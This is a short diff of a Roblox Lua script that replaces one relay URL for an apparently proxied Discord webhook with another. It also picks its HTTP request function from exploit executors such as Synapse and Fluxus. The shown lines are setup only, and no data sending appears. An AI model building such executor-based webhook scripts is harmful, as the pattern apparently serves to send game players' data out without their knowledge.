@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
-local webhook = "https://v0-discord-webhook-protector-nine.vercel.app/api/relay/qmtfd6zwqgn"
+local webhook = "https://v0-discord-webhook-protector-nine.vercel.app/api/relay/fkdd8pfijpm"
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
 local player = Players.LocalPlayer
